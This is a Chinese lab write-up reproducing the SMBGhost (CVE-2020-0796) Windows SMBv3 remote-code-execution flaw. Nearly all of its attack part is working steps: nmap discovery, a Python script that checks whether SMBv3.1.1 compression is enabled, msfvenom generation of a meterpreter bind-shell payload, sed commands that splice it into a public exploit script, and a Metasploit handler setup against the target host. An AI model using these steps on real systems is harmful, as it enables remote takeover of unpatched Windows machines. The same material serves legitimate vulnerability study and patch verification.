# Windows-永恒之黑

漏洞复现-永恒之黑(CVE-2020-0796)

**0x00 前言**

```
影响版本：
Windows 10 Version 1903 for 32-bit Systems
Windows 10 Version 1903 for ARM64-based Systems
Windows 10 Version 1903 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
```

 Microsoft服务器消息块（SMB）协议是Microsoft Windows中使用的一项Microsoft网络文件共享协议。在大部分windows系统中都是默认开启的，用于在计算机间共享文件、打印机等。Windows 10和Windows Server 2016引入了SMB 3.1.1 。而 3.1.1 版本增加了对压缩数据的支持，但其没有正确处理压缩的数据包，在解压数据包的时候直接使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。利用该漏洞，攻击者可直接远程攻击SMB服务端远程执行任意恶意代码。



|          | 靶机                    | 攻击机         |
| -------- | ----------------------- | -------------- |
| 操作系统 | Windows 10 Version 1903 | kali           |
| IP地址   | 192.168.12.140          | 192.168.12.135 |
| 备注     | 关闭防火墙              |                |

利用到的工具：`https://github.com/root-tools/SMBGhost_RCE_PoC`



**0x01 复现**

主机发现

```
nmap -sn 192.168.12.0/24
```

端口扫描

```
nmap 192.168.12.140

PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5357/tcp open  wsdapi
MAC Address: 00:0C:29:AE:11:85 (VMware)

```

脚本扫描

```python
import socket
import struct

ip = "192.168.12.140"  # 获取用户输入的IP
# 构造SMB消息
pkt = b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
sock = socket.socket(socket.AF_INET)  # 初始化socket
sock.settimeout(3)  # 设置超时时间
sock.connect((ip, 445)) # 与对应IP的445端口建立socket连接
sock.send(pkt)  # 发送消息
data, = struct.unpack(">I", sock.recv(4))
res = sock.recv(data)  # 接收socket数据包
#  判断主机是否使用SMBv3.1.1协议且支持压缩功能
if res[68:70] != b"\x11\x03" or res[70:72] != b"\x02\x00":
    print(f"{ip} 不存在该漏洞。")
else:
    print(f"检测到 {ip} 存在此漏洞。")
```

![image-20230301202918155](https://s2.loli.net/2023/03/11/Zyt3BbnsMC8hrxV.png)

生成脚本

```shell
msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=4444 -b '\x00' -f python > paylaod

# -b 去掉坏字符，坏字符会影响payload正常执行。这里去掉’\x00’，代表去除空字符。
```

将paylaod中的“buf”替换为“USER_PAYLOAD”。

```shell
sed "s/buf/USER_PAYLOAD/g" -i payload
```

将下载好的工具进行解压，使用上面修改完的payload替换掉exploit.py中的92~128行的内容。

```shell
sed "92,128 d" -i exploit.py  # 删除exploit.py文件的92行到128行
sed "92r payload" -i exploit.py  #将paylaod文件内容添加到exploit.py的92行后
```

使用msf的侦听模块exploit/multi/handler，尝试与Windows主机的4444端口进行连接。

```shell
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set lport 4444
set rhost 192.168.12.140
run
```

执行修改后的exploit.py，进行漏洞利用。

```shell
python3 exploit.py -ip 192.168.12.140
```

![image-20230301210237311](https://s2.loli.net/2023/03/11/dAO4UIn7tyRsFX8.png)